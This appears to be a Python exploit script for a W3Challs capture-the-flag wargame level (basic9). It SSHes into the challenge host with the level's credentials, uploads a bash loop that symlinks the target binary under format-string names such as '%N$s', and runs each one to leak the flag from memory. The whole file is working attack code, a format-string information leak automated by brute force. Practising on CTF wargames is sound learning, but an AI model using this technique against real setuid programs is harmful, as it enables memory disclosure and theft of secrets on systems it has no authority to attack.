#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])

print("[✓] Conectado!")

child.sendline(b"cd /tmp")
child.expect([b'\\$'])

print("\n[*] Búsqueda final en rango 1-500...")

# Crear un script bash para búsqueda rápida
script = b'''#!/bin/bash
echo "[*] Buscando flag..."
for i in $(seq 1 500); do
    ln -sf /home/basic9/basic9 "%$i\$s" 2>/dev/null
    result=$(./%$i\$s x 2>&1 | strings -n 10 | grep -o "W3C{[^}]*}" | head -1)
    if [ ! -z "$result" ]; then
        echo "[!] ENCONTRADO en posicion $i: $result"
        exit 0
    fi
    if [ $((i % 50)) -eq 0 ]; then
        echo "  Probadas $i posiciones..."
    fi
done
echo "[!] No encontrado en 1-500"
'''

child.sendline(b'cat > search.sh')
child.sendline(script)
child.sendcontrol('d')
child.expect([b'\\$'])

child.sendline(b'chmod +x search.sh && ./search.sh')

# Esperar hasta 3 minutos
index = child.expect([b'ENCONTRADO', b'No encontrado', pexpect.TIMEOUT], timeout=180)

if index == 0:
    child.expect([b'\\$'], timeout=5)
    output = child.before
    print(output.decode('utf-8', errors='ignore'))
    
    import re
    match = re.search(r'W3C\{[^\}]*\}', output.decode('utf-8', errors='ignore'))
    if match:
        print(f"\n🔥🔥🔥 FLAG: {match.group(0)} 🔥🔥🔥")
else:
    print("[!] No se encontró la flag en posiciones 1-500")

child.close()